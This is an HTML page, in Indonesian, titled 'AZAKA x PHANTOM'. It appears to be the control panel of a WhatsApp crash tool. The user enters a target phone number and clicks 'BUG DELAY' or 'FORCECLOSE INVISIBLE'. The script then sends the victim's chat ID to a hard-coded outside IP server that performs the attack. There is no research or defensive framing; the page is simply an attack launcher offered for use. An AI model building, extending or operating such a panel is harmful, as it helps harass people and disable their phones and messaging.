<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>AZAKA x PHANTOM</title>
  <link rel="stylesheet" href="style.css" />
  <style>
    body {
      margin: 0;
      padding: 0;
      background: url('background.jpg') no-repeat center center fixed;
      background-size: cover;
      font-family: sans-serif;
      color: white;
      text-align: center;
    }

    .container {
      margin-top: 80px;
      padding: 20px;
    }

    h1 {
      font-size: 32px;
      color: red;
      font-weight: bold;
      margin-bottom: 30px;
    }

    input[type="text"] {
      padding: 10px;
      border: none;
      border-radius: 10px;
      width: 80%;
      max-width: 300px;
      margin-bottom: 20px;
    }

    .btn {
      background-color: crimson;
      color: white;
      padding: 12px 24px;
      margin: 10px;
      border: none;
      border-radius: 8px;
      font-weight: bold;
      cursor: pointer;
    }

    .btn:hover {
      background-color: darkred;
    }

    .logout-btn {
      position: absolute;
      top: 15px;
      left: 15px;
      background-color: red;
      color: white;
      padding: 5px 12px;
      font-size: 13px;
      border: none;
      border-radius: 6px;
      cursor: pointer;
      z-index: 999;
    }

    .logout-btn:hover {
      background-color: darkred;
    }

    .status {
      margin-top: 30px;
      font-weight: bold;
      color: yellow;
    }
  </style>
</head>
<body>
  <button class="logout-btn" onclick="logout()">Logout</button>

  <div class="container">
    <h1>AZAKA x PHANTOM</h1>
    <input type="text" id="target" placeholder="Masukkan nomor target (62xxxxx)" />
    <br />
    <button class="btn" onclick="sendAPI('delay')">BUG DELAY</button>
    <button class="btn" onclick="sendAPI('fcin')">FORCECLOSE INVISIBLE</button>
    <div class="status" id="status">⚠️ Gagal memuat status</div>
  </div>

  <script>
    const chatApiUrl = "https://raw.githubusercontent.com/CILZ-CRASHER/apk/main/akun.json";

    function sendAPI(type) {
      const number = document.getElementById("target").value.trim();
      if (!number) {
        alert("Masukkan nomor target terlebih dahulu.");
        return;
      }
      let apiUrl = "";
      if (type === "delay") {
        apiUrl = `http://46.101.32.52:2004/evolution?type=delay&chatId=${number}@s.whatsapp.net`;
      } else if (type === "fcin") {
        apiUrl = `http://46.101.32.52:2004/evolution?type=fcin&chatId=${number}@s.whatsapp.net`;
      }
      fetch(apiUrl)
        .then(res => res.text())
        .then(res => {
          document.getElementById("status").innerText = `✅ Berhasil: ${res}`;
        })
        .catch(() => {
          document.getElementById("status").innerText = "⚠️ Gagal memuat status";
        });
    }

    function logout() {
      localStorage.removeItem("login");
      window.location.href = "login.html";
    }

    // Cek apakah sudah login
    if (!localStorage.getItem("login")) {
      window.location.href = "login.html";
    }
  </script>
</body>
</html>
